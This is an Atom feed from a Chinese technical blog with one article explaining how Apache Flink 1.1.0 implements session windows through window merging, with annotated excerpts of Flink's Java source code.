<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jark&#39;s Blog</title>
  <subtitle>当你的才华还撑不起你的野心时，你就应该静下心来学习。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://wuchong.me/"/>
  <updated>2016-06-06T03:53:29.000Z</updated>
  <id>http://wuchong.me/</id>
  
  <author>
    <name>WuChong</name>
    <email>imjark@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Flink 原理与实现：Session Window</title>
    <link href="http://wuchong.me/blog/2016/06/06/flink-internals-session-window/"/>
    <id>http://wuchong.me/blog/2016/06/06/flink-internals-session-window/</id>
    <published>2016-06-06T03:48:45.000Z</published>
    <updated>2016-06-06T03:53:29.000Z</updated>
    
    <content type="html">&lt;p&gt;在&lt;a href=&quot;http://wuchong.me/blog/2016/05/25/flink-internals-window-mechanism/&quot;&gt;上一篇文章：Window机制&lt;/a&gt;中，我们介绍了窗口的概念和底层实现，以及 Flink 一些内建的窗口，包括滑动窗口、翻滚窗口。本文将深入讲解一种较为特殊的窗口：会话窗口（session window）。建议您在阅读完上一篇文章的基础上再阅读本文。&lt;/p&gt;
&lt;p&gt;当我们需要分析用户的一段交互的行为事件时，通常的想法是将用户的事件流按照“session”来分组。session 是指一段持续活跃的期间，由活跃间隙分隔开。通俗一点说，消息之间的间隔小于超时阈值（sessionGap）的，则被分配到同一个窗口，间隔大于阈值的，则被分配到不同的窗口。目前开源领域大部分的流计算引擎都有窗口的概念，但是没有对 session window 的支持，要实现 session window，需要用户自己去做完大部分事情。而当 Flink 1.1.0 版本正式发布时，Flink 将会是开源流计算领域第一个内建支持 session window 的引擎。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;在 Flink 1.1.0 之前，Flink 也可以通过自定义的window assigner和trigger来实现一个基本能用的session window。&lt;code&gt;release-1.0&lt;/code&gt; 版本中提供了一个实现 session window 的 example：&lt;a href=&quot;https://github.com/apache/flink/blob/release-1.0/flink-examples/flink-examples-streaming/src/main/java/org/apache/flink/streaming/examples/windowing/SessionWindowing.java&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SessionWindowing&lt;/a&gt;。这个session window范例的实现原理是，基于GlobleWindow这个window assigner，将所有元素都分配到同一个窗口中，然后指定一个自定义的trigger来触发执行窗口。这个trigger的触发机制是，对于每个到达的元素都会根据其时间戳（timestamp）注册一个会话超时的定时器（timestamp+sessionTimeout），并移除上一次注册的定时器。最新一个元素到达后，如果超过 sessionTimeout 的时间还没有新元素到达，那么trigger就会触发，当前窗口就会是一个session window。处理完窗口后，窗口中的数据会清空，用来缓存下一个session window的数据。&lt;/p&gt;
&lt;p&gt;但是这种session window的实现是非常弱的，无法应用到实际生产环境中的。因为它无法处理乱序 event time 的消息。  而在即将到来的 Flink 1.1.0 版本中，Flink 提供了对 session window 的直接支持，用户可以通过&lt;code&gt;SessionWindows.withGap()&lt;/code&gt;来轻松地定义 session widnow，而且能够处理乱序消息。Flink 对 session window 的支持主要借鉴自 Google 的 DataFlow 。&lt;/p&gt;
&lt;h2 id=&quot;Session-Window-in-Flink&quot;&gt;&lt;a href=&quot;#Session-Window-in-Flink&quot; class=&quot;headerlink&quot; title=&quot;Session Window in Flink&quot;&gt;&lt;/a&gt;Session Window in Flink&lt;/h2&gt;&lt;p&gt;假设有这么个场景，用户点开手机淘宝后会进行一系列的操作（点击、浏览、搜索、购买、切换tab等），这些操作以及对应发生的时间都会发送到服务器上进行用户行为分析。那么用户的操作行为流的样例可能会长下面这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1rvs8KXXXXXXiXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;通过上图，我们可以很直观地观察到，用户的行为是一段一段的，每一段内的行为都是连续紧凑的，段内行为的关联度要远大于段之间行为的关联度。我们把每一段用户行为称之为“session”，段之间的空档我们称之为“session gap”。所以，理所当然地，我们应该按照 session window 对用户的行为流进行切分，并计算每个session的结果。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1jB3_KXXXXXcgXFXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;为了定义上述的窗口切分规则，我们可以使用 Flink 提供的 &lt;code&gt;SessionWindows&lt;/code&gt; 这个 widnow assigner API。如果你用过 &lt;code&gt;SlidingEventTimeWindows&lt;/code&gt;、&lt;code&gt;TumlingProcessingTimeWindows&lt;/code&gt;等，你会对这个很熟悉。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;DataStream input = …&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DataStream result = input&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .keyBy(&amp;lt;key selector&amp;gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .window(SessionWindows.withGap(Time.seconds(&amp;lt;seconds&amp;gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .apply(&amp;lt;window function&amp;gt;) &lt;span class=&quot;comment&quot;&gt;// or reduce() or fold()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样，Flink 就会基于元素的时间戳，自动地将元素放到不同的session window中。如果两个元素的时间戳间隔小于 session gap，则会在同一个session中。如果两个元素之间的间隔大于session gap，且没有元素能够填补上这个gap，那么它们会被放到不同的session中。&lt;/p&gt;
&lt;h2 id=&quot;底层实现&quot;&gt;&lt;a href=&quot;#底层实现&quot; class=&quot;headerlink&quot; title=&quot;底层实现&quot;&gt;&lt;/a&gt;底层实现&lt;/h2&gt;&lt;p&gt;为了实现 session window，我们需要扩展 Flink 中的窗口机制，使得能够支持窗口合并。要理解其原因，我们需要先了解窗口的现状。在上一篇文章中，我们谈到了 Flink 中 WindowAssigner 负责将元素分配到哪个/哪些窗口中去，Trigger 决定了一个窗口何时能够被计算或清除。当元素被分配到窗口之后，这些窗口是固定的不会改变的，而且窗口之间不会相互作用。&lt;/p&gt;
&lt;p&gt;对于session window来说，我们需要窗口变得更灵活。基本的思想是这样的：&lt;code&gt;SessionWindows&lt;/code&gt; assigner 会为每个进入的元素分配一个窗口，该窗口以元素的时间戳作为起始点，时间戳加会话超时时间为结束点，也就是该窗口为&lt;code&gt;[timestamp, timestamp+sessionGap)&lt;/code&gt;。比如我们现在到了两个元素，它们被分配到两个独立的窗口中，两个窗口目前不相交，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1174pKpXXXXbVXXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当第三个元素进入时，分配到的窗口与现有的两个窗口发生了叠加，情况变成了这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB19.g5KXXXXXX.XVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;由于我们支持了窗口的合并，&lt;code&gt;WindowAssigner&lt;/code&gt;可以合并这些窗口。它会遍历现有的窗口，并告诉系统哪些窗口需要合并成新的窗口。Flink 会将这些窗口进行合并，合并的主要内容有两部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需要合并的窗口的底层状态的合并（也就是窗口中缓存的数据，或者对于聚合窗口来说是一个聚合值）&lt;/li&gt;
&lt;li&gt;需要合并的窗口的Trigger的合并（比如对于EventTime来说，会删除旧窗口注册的定时器，并注册新窗口的定时器）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总之，结果是三个元素现在在同一个窗口中了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1iFw0KXXXXXcoXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;需要注意的是，对于每一个新进入的元素，都会分配一个属于该元素的窗口，都会检查并合并现有的窗口。在触发窗口计算之前，每一次都会检查该窗口是否可以和其他窗口合并，直到trigger触发后，会将该窗口从窗口列表中移除。对于 event time 来说，窗口的触发是要等到大于窗口结束时间的 watermark 到达，当watermark没有到，窗口会一直缓存着。所以基于这种机制，可以做到对乱序消息的支持。&lt;/p&gt;
&lt;p&gt;这里有一个优化点可以做，因为每一个新进入的元素都会创建属于该元素的窗口，然后合并。如果新元素连续不断地进来，并且新元素的窗口一直都是可以和之前的窗口重叠合并的，那么其实这里多了很多不必要的创建窗口、合并窗口的操作，我们可以直接将新元素放到那个已存在的窗口，然后扩展该窗口的大小，看起来就像和新元素的窗口合并了一样。&lt;/p&gt;
&lt;h2 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/FLINK-3174&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FLINK-3174&lt;/a&gt; 这个JIRA中有对 Flink 如何支持 session window 的详细说明，以及代码更新。建议可以结合该 &lt;a href=&quot;https://github.com/apache/flink/pull/1460&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PR&lt;/a&gt; 的代码来理解本文讨论的实现原理。&lt;/p&gt;
&lt;p&gt;为了扩展 Flink 中的窗口机制，使得能够支持窗口合并，首先 window assigner 要能合并现有的窗口，Flink 增加了一个新的抽象类 &lt;code&gt;MergingWindowAssigner&lt;/code&gt; 继承自 &lt;code&gt;WindowAssigner&lt;/code&gt;，这里面主要多了一个 &lt;code&gt;mergeWindows&lt;/code&gt; 的方法，用来决定哪些窗口是可以合并的。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;MergingWindowAssigner&lt;/span&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;T&lt;/span&gt;, &lt;span class=&quot;title&quot;&gt;W&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Window&lt;/span&gt;&amp;gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;WindowAssigner&lt;/span&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;T&lt;/span&gt;, &lt;span class=&quot;title&quot;&gt;W&lt;/span&gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; serialVersionUID = &lt;span class=&quot;number&quot;&gt;1L&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * 决定哪些窗口需要被合并。对于每组需要合并的窗口, 都会调用 callback.merge(toBeMerged, mergeResult)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * &lt;span class=&quot;doctag&quot;&gt;@param&lt;/span&gt; windows 现存的窗口集合 The window candidates.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * &lt;span class=&quot;doctag&quot;&gt;@param&lt;/span&gt; callback 需要被合并的窗口会回调 callback.merge 方法&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;mergeWindows&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Collection&amp;lt;W&amp;gt; windows, MergeCallback&amp;lt;W&amp;gt; callback)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;MergeCallback&lt;/span&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;W&lt;/span&gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     * 用来声明合并窗口的具体动作（合并窗口底层状态、合并窗口trigger等）。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     * &lt;span class=&quot;doctag&quot;&gt;@param&lt;/span&gt; toBeMerged  需要被合并的窗口列表&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     * &lt;span class=&quot;doctag&quot;&gt;@param&lt;/span&gt; mergeResult 合并后的窗口&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;merge&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Collection&amp;lt;W&amp;gt; toBeMerged, W mergeResult)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;所有已经存在的 assigner 都继承自 &lt;code&gt;WindowAssigner&lt;/code&gt;，只有新加入的 session window assigner 继承自 &lt;code&gt;MergingWindowAssigner&lt;/code&gt;，如：&lt;code&gt;ProcessingTimeSessionWindows&lt;/code&gt;和&lt;code&gt;EventTimeSessionWindows&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;另外，Trigger 也需要能支持对合并窗口后的响应，所以 Trigger 添加了一个新的接口 &lt;code&gt;onMerge(W window, OnMergeContext ctx)&lt;/code&gt;，用来响应发生窗口合并之后对trigger的相关动作，比如根据合并后的窗口注册新的 event time 定时器。&lt;/p&gt;
&lt;p&gt;OK，接下来我们看下最核心的代码，也就是对于每个进入的元素的处理，代码位于&lt;code&gt;WindowOperator.processElement&lt;/code&gt;方法中，如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;processElement&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(StreamRecord&amp;lt;IN&amp;gt; element)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Collection&amp;lt;W&amp;gt; elementWindows = windowAssigner.assignWindows(element.getValue(), element.getTimestamp());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; K key = (K) getStateBackend().getCurrentKey();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (windowAssigner &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; MergingWindowAssigner) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 对于session window 的特殊处理，我们只关注该条件块内的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MergingWindowSet&amp;lt;W&amp;gt; mergingWindows = getMergingWindowSet();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (W window: elementWindows) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; Tuple1&amp;lt;TriggerResult&amp;gt; mergeTriggerResult = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Tuple1&amp;lt;&amp;gt;(TriggerResult.CONTINUE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 加入新窗口, 如果没有合并发生,那么actualWindow就是新加入的窗口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 如果有合并发生, 那么返回的actualWindow即为合并后的窗口,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 并且会调用 MergeFunction.merge 方法, 这里方法中的内容主要是更新trigger, 合并旧窗口中的状态到新窗口中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      W actualWindow = mergingWindows.addWindow(window, &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MergingWindowSet.MergeFunction&amp;lt;W&amp;gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;meta&quot;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;merge&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(W mergeResult,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Collection&amp;lt;W&amp;gt; mergedWindows, W stateWindowResult,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Collection&amp;lt;W&amp;gt; mergedStateWindows)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          context.key = key;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          context.window = mergeResult;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;comment&quot;&gt;// 这里面会根据新窗口的结束时间注册新的定时器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          mergeTriggerResult.f0 = context.onMerge(mergedWindows);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;comment&quot;&gt;// 删除旧窗口注册的定时器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (W m: mergedWindows) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            context.window = m;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            context.clear();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;comment&quot;&gt;// 合并旧窗口(mergedStateWindows)中的状态到新窗口（stateWindowResult）中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          getStateBackend().mergePartitionedStates(stateWindowResult,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              mergedStateWindows,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              windowSerializer,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              (StateDescriptor&amp;lt;? extends MergingState&amp;lt;?,?&amp;gt;, ?&amp;gt;) windowStateDescriptor);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 取 actualWindow 对应的用来存状态的窗口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      W stateWindow = mergingWindows.getStateWindow(actualWindow);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 从状态后端拿出对应的状态 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      AppendingState&amp;lt;IN, ACC&amp;gt; windowState = getPartitionedState(stateWindow, windowSerializer, windowStateDescriptor);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 将新进入的元素数据加入到新窗口（或者说合并后的窗口）中对应的状态中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      windowState.add(element.getValue());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      context.key = key;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      context.window = actualWindow;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 检查是否需要fire or purge &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      TriggerResult triggerResult = context.onElement(element);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      TriggerResult combinedTriggerResult = TriggerResult.merge(triggerResult, mergeTriggerResult.f0);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 根据trigger结果决定怎么处理窗口中的数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      processTriggerResult(combinedTriggerResult, actualWindow);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 对于普通window assigner的处理， 这里我们不关注&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (W window: elementWindows) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      AppendingState&amp;lt;IN, ACC&amp;gt; windowState = getPartitionedState(window, windowSerializer,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          windowStateDescriptor);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      windowState.add(element.getValue());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      context.key = key;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      context.window = window;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      TriggerResult triggerResult = context.onElement(element);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      processTriggerResult(triggerResult, window);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其实这段代码写的并不是很clean，并且不是很好理解。在第六行中有用到&lt;code&gt;MergingWindowSet&lt;/code&gt;，这个类很重要所以我们先介绍它。这是一个用来跟踪窗口合并的类。比如我们有A、B、C三个窗口需要合并，合并后的窗口为D窗口。这三个窗口在底层都有对应的状态集合，为了避免代价高昂的状态替换（创建新状态是很昂贵的），我们保持其中一个窗口作为原始的状态窗口，其他几个窗口的数据合并到该状态窗口中去，比如随机选择B作为状态窗口，那么A和C窗口中的数据需要合并到B窗口中去。这样就没有新状态产生了，但是我们需要额外维护窗口与状态窗口之间的映射关系（D-&amp;gt;B），这就是&lt;code&gt;MergingWindowSet&lt;/code&gt;负责的工作。这个映射关系需要在失败重启后能够恢复，所以&lt;code&gt;MergingWindowSet&lt;/code&gt;内部也是对该映射关系做了容错。状态合并的工作示意图如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB15U4lKpXXXXc9XXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后我们来解释下processElement的代码，首先根据window assigner为新进入的元素分配窗口集合。接着进入第一个条件块，取出当前的&lt;code&gt;MergingWindowSet&lt;/code&gt;。对于每个分配到的窗口，我们就会将其加入到&lt;code&gt;MergingWindowSet&lt;/code&gt;中（&lt;code&gt;addWindow&lt;/code&gt;方法），由&lt;code&gt;MergingWindowSet&lt;/code&gt;维护窗口与状态窗口之间的关系，并在需要窗口合并的时候，合并状态和trigger。然后根据映射关系，取出结果窗口对应的状态窗口，根据状态窗口取出对应的状态。将新进入的元素数据加入到该状态中。最后，根据trigger结果来对窗口数据进行处理，对于session window来说，这里都是不进行任何处理的。真正对窗口处理是由定时器超时后对完成的窗口调用&lt;code&gt;processTriggerResult&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;本文在&lt;a href=&quot;http://wuchong.me/blog/2016/05/25/flink-internals-window-mechanism/&quot;&gt;上一篇文章：Window机制&lt;/a&gt;的基础上，深入讲解了 Flink 是如何支持 session window 的，核心的原理是窗口的合并。Flink 对于 session window 的支持很大程度上受到了 Google DataFlow 的启发，所以也建议阅读下 DataFlow 的论文。&lt;/p&gt;
